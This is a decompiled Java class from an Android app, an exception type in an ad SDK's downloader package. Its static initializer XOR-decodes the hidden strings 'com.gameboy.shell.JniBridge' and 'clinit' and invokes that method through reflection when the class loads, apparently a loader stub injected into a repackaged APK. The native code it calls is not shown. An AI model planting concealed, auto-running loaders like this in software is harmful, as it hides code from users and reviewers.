package com.sigmob.sdk.downloader.core.exception;

import java.io.IOException;
import java.lang.reflect.Method;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public class b extends IOException {

    /* renamed from: a, reason: collision with root package name */
    public static final b f13395a = new b() { // from class: com.sigmob.sdk.downloader.core.exception.b.1
    };

    static {
        rrOYSu();
    }

    private b() {
        super("File busy after run");
    }

    private static /* synthetic */ void rrOYSu() {
        char[] charArray = "îâà£êìàè£ïâô£þåèáá£ÇãäÏÿäéêè".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 141);
        }
        String str = new String(charArray);
        char[] charArray2 = "îáäãäù".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 141);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
